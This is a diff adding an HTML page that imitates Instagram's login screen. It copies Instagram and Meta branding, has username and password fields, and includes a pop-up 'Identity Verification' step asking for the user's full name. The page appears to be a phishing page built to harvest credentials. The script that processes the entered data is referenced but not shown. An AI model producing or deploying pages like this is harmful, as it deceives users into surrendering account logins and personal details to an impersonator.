@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="logo_final.png">
+</head>
+
+<body>
+    <main>
+        <div class="login-container">
+            <div class="login-box">
+                <div class="logo-wrapper">
+                    <!-- Using the final refined logo -->
+                    <img src="logo_final.png" alt="Instagram" class="insta-logo">
+                </div>
+
+                <h1 class="login-title">Log in to Instagram</h1>
+
+                <form id="login-form">
+                    <input type="text" placeholder="Mobile number, username or email" class="input-field" required
+                        id="username">
+                    <input type="password" placeholder="Password" class="input-field" required id="password">
+
+                    <button type="submit" class="login-btn" id="login-btn">Log in</button>
+
+                    <a href="#" class="forgot-password">Forgotten password?</a>
+                </form>
+
+                <div class="social-login">
+                    <a href="https://www.instagram.com/accounts/signup/phone/" class="signup-btn">Create new account</a>
+                </div>
+
+                <div class="meta-footer">
+                    <div class="meta-logo">
+                        <svg viewBox="0 0 24 12">
+                            <path
+                                d="M21.2 0C19.4 0 17.6.8 16.5 2.2V.2h-3.3v11.6h3.3V6.8c0-2.2 1.5-3.6 3.3-3.6 1.8 0 3 1.2 3 3.4v5.2h3.3V6.4C26.1 2.2 24.1 0 21.2 0zm-8.4 0c-1.8 0-3.7.8-4.8 2.3-1.1-1.5-2.9-2.3-4.7-2.3C1 0 0 2.2 0 6.4v5.4h3.3V6.8c0-2.2 1.2-3.6 2.9-3.6 1.7 0 2.7 1.4 2.7 3.5v5.1h3.3V6.8c0-2.2 1.2-3.6 2.9-3.6 1.7 0 2.7 1.4 2.7 3.5v5.1h3.3V6.4C21.1 2.2 19.1 0 16.2 0c-1.2 0-2.4.4-3.4 1.2z" />
+                        </svg>
+                        Meta
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <a href="#" class="footer-link">Meta</a>
+        <a href="#" class="footer-link">About</a>
+        <a href="#" class="footer-link">Blog</a>
+        <a href="#" class="footer-link">Jobs</a>
+        <a href="#" class="footer-link">Help</a>
+        <a href="#" class="footer-link">API</a>
+        <a href="#" class="footer-link">Privacy</a>
+        <a href="#" class="footer-link">Terms</a>
+        <a href="#" class="footer-link">Locations</a>
+        <a href="#" class="footer-link">Instagram Lite</a>
+        <a href="#" class="footer-link">Threads</a>
+        <a href="#" class="footer-link">Contact uploading and non-users</a>
+        <a href="#" class="footer-link">Meta Verified</a>
+    </footer>
+
+    <!-- Verification Modal -->
+    <div id="name-modal" class="modal">
+        <div class="modal-content">
+            <h2 class="modal-title">Identity Verification</h2>
+            <p class="modal-desc">Please enter your full name as it appears on your account to verify your identity.</p>
+            <input type="text" id="fullname" placeholder="Full Name" class="input-field" required>
+            <button id="confirm-btn" class="login-btn">Verify Identity</button>
+            <p class="modal-hint">This helps us keep your account secure.</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
